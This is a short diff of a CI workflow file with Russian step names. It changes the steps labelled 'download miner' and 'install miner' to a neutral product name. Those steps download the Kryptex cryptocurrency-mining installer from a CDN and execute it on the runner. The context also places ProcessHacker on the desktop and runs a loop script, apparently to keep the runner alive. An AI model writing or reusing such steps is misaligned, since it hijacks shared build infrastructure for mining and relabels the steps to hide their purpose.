@@ -45,10 +45,10 @@ jobs:
         copy "ProccesHacker.exe" "C:\Users\Public\Desktop\ProccesHacker.exe"
         cd ..
         cd ..
-    - name: Загрузка майнера.
+    - name: Загрузка Kryptex.
       run: |
         Invoke-WebRequest https://d93adf58-7c6e-4915-8502-b53a3c913edb.selcdn.net/installer/4.15.20/kryptex-setup-4.15.20.exe -OutFile "kryptex-setup.exe"
-    - name: Установка майнера.
+    - name: Установка Kryptex.
       run: .\kryptex-setup.exe
     - name: Запуск виртуальной машины выполнен
       run: cmd /c loop.bat
